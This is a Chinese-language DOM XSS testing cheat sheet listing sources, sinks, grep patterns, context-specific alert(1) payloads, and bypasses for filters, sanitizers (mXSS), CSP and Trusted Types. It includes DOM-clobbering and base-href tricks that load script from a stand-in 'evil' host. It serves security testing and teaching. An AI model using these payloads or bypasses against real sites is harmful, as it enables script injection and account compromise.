# DOM XSS

## Sources（优先抓这几个）
- `location.search` / `location.hash` / `location.pathname` / `location.href` / `document.URL` / `document.documentURI` / `document.baseURI`
- `document.referrer`、`window.name`（跨导航保持，可做无服务端投递通道）
- `postMessage` 的 `event.data`（含 `event.origin` 未校验的场景）
- `localStorage` / `sessionStorage` / `history.state` / `document.cookie` / IndexedDB
- 服务端渲染进 HTML 的 `data-*` 属性、内联 JSON、AJAX/JSONP 回包再进 DOM 的部分
- 路由/框架的 hash 或 query 解析器（Angular/React Router 自解析 hash 常绕过服务端编码）

## Sinks（按上下文分类）
- HTML 解析：`innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write`/`writeln`、`Range.createContextualFragment`、`DOMParser.parseFromString(_,'text/html')` 后再插入、`jQuery.parseHTML`
- JS 执行：`eval`、`Function`/`new Function`、`setTimeout`/`setInterval`（字符串参数）、`jQuery.globalEval`、`import()`、`importScripts`、`new Worker(blob)`
- 导航/URL：`location.href`/`assign`/`replace`、`window.open`、`a.href`、`iframe.src`、`form.action`、`button.formaction`、`object.data`、`embed.src`、`link.href`
- 属性注入：`setAttribute('on*')`、`setAttribute('srcdoc')`、`iframe.srcdoc`、`video/audio.src`、`script.src`/`script.text`、`style.cssText` 与 `</style>` 逃逸
- 框架：React `dangerouslySetInnerHTML` / `href="javascript:"`、Vue `v-html` / `new Vue({template:userInput})`、AngularJS `ng-app` + `{{}}` / `bypassSecurityTrustHtml`、Svelte `{@html}`、jQuery `$('<html>')` / `.html()` / `.append()`

## 快速定位（grep 源码）
```
innerHTML|outerHTML|insertAdjacentHTML|document\.write|createContextualFragment
\beval\(|new Function|setTimeout\(\s*['"`]|setInterval\(\s*['"`]
location\s*=|location\.(href|assign|replace)|\.src\s*=|\.href\s*=
dangerouslySetInnerHTML|v-html|\{@html\}|\$\(.*location|\.html\(
```
打 sink 断点比追 source 快：`debug(document.write)`、`Object.defineProperty(HTMLElement.prototype,'innerHTML',{set(v){debugger}})`，看调用栈和入参。

## Payload 模板（按 sink 上下文选）
- HTML 文本（innerHTML/insertAdjacentHTML/outerHTML）：
  - `<img src=x onerror=alert(1)>`
  - `<svg onload=alert(1)>`
  - `<details open ontoggle=alert(1)>`
  - `<video><source onerror=alert(1)>`
  - `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">`
- 属性值拼接：
  - `" onmouseover=alert(1) x="`
  - `' autofocus onfocus=alert(1) x='`
  - 无引号：`x onmouseover=alert(1)`
  - 属性内直接闭合：`"><img src=x onerror=alert(1)>`
- JS 字符串 / 模板串：
  - `';alert(1)//`、`\';alert(1)//`
  - `</script><script>alert(1)</script>`
  - 模板串内：`` `${alert(1)}` ``
- `document.write`：
  - 在 `<script>` 内调用：`</script><img src=x onerror=alert(1)>`
  - parser 阶段：`<script>alert(1)</script>`（load 完成后 write 会清空页面，慎用）
- URL sink：
  - `javascript:alert(1)`（`a.href` 需点击；脚本里 `location.href='javascript:...'` 现代 Chrome 拦截）
  - `java\tscript:` / `java%09script:` / `\u0001javascript:`
  - `data:text/html,<script>alert(1)</script>`（仅 iframe.src / 子窗口可用，顶层导航被拦）
- jQuery：`$('<img src=x onerror=alert(1)>')`；经 `.html()/.append()/.before()` 的走 innerHTML 路径；`.append('<script>')` 会执行
- 框架：
  - Vue2 编译用户串：`{{constructor.constructor('alert(1)')()}}`
  - AngularJS：注入 `ng-app` + `{{constructor.constructor('alert(1)')()}}`
- postMessage 接收端：`{"type":"x","data":"<img src=x onerror=alert(1)>"}`
  - 发送：`frames[0].postMessage(p,'*')`；新窗口 `w=window.open(u);setTimeout(()=>w.postMessage(p,'*'),1000)`

## 绕过
- 编码只在对应上下文有效：`\uXXXX`/`\xNN`/`String.fromCharCode`/`atob` 只在 JS 字符串上下文成立；HTML 上下文里 `&lt;` 不会重解析成 `<`（innerHTML 场景别浪费时间）；URL 单/双编码 `%253C`、`%2522`
- 标签/空格黑名单：`<svg/onload=alert(1)>`（`/` 代空格）、`<img/src=x/onerror=alert(1)>`
- 括号/关键字黑名单：`onerror=alert,1`、``onerror=alert`1` ``、`onerror=throw onerror=alert,1`、`confirm(1)`、`print()`、`top['ale'+'rt'](1)`、`[].constructor.constructor('alert(1)')()`
- 单次替换/非递归过滤：`<scr<script>ipt>`、`<im<img>g src=x onerror=alert(1)>`
- mXSS（sanitizer 输出再进 innerHTML 变异）：
  - `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
  - `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">`
- DOM clobbering 控制后续 `script.src`：`<form id=cfg><input name=url value=//evil/x.js></form>`；`<img name=currentScript>` 影响读 `document.currentScript` 的库；`<a id=x>` 覆盖 `window.x`
- `<base href=//evil>` 劫持相对路径脚本（无 `base-uri` 时）
- CSP：找同域 JSONP/`callback` 端点补 `script-src`；`unsafe-eval` 下走 `setTimeout`/`Function`；nonce 复用或可预测时直接带 nonce；strict-dynamic 下找允许域内 gadget
- Trusted Types：若只声明 `require-trusted-types-for 'script'` 且默认 policy 存在，找走默认 policy 的 sink；`srcdoc`、`iframe` 内文档常不受 TT 约束
- sandbox：无 `allow-scripts` 时 payload 不执行，改打父窗口或换投递点

## 坑
- `innerHTML` 里的 `<script>` 永不执行；`<img onerror>` 插入 **detached 节点**也不触发，必须 attach 到 document
- `src=x` 若同源 SPA 回退返回 200，`onerror` 不触发 → 用 `src=//0` 或 `src=x?`
- `javascript:` 前若已拼 `https://` 或做了协议白名单校验，直接失效
- fragment 不经服务端，但服务端 CSP 头、后端编码仍全程生效
- `console` 手测 `el.innerHTML=payload` 能弹 ≠ 真实注入路径可达（路上可能被 `encodeURIComponent`/`textContent` 截断）
- 每个 payload 都要回到真实 sink 上下文验证：HTML 文本 / 属性 / JS 字符串 / URL 四选一，选错必然不触发

## 检查清单
- `location.*` / `referrer` / `window.name` / `postMessage.data` / storage 的值流到哪个 sink？中间有没有编码/白名单？
- 能否只用 fragment 或 `window.name` 投递（服务端盲区）？
- sink 上下文与 payload 是否匹配？
- 是否卡在 CSP / Trusted Types / iframe sandbox？换 JSONP、非 TT sink、父窗口路径试。